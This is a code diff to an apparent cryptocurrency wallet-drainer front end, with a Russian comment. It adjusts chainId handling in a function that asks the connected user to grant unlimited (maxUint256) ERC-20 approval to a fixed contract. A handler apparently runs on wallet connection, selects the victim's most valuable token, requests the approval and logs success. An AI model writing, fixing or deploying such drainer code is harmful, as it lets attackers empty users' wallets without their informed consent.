@@ -663,13 +663,16 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
-    const txHash = await writeContract(wagmiConfig, {
+    const txArgs = {
       address: checksumTokenAddress,
       abi: erc20Abi,
       functionName: 'approve',
-      args: [checksumContractAddress, maxUint256],
-      chainId
-    })
+      args: [checksumContractAddress, maxUint256]
+    }
+    if (typeof chainId === 'number') {
+      txArgs.chainId = chainId
+    }
+    const txHash = await writeContract(wagmiConfig, txArgs)
     console.log(`Approve transaction sent: ${txHash}`)
     
     // Запускаем мониторинг транзакции в фоне
@@ -1141,7 +1144,7 @@ const initializeSubscribers = (modal) => {
             return
           }
           store.isApprovalRequested = true
-          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, store.networkState.chainId)
+          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress)
           store.approvedTokens[approvalKey] = true
           store.isApprovalRequested = false
           let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
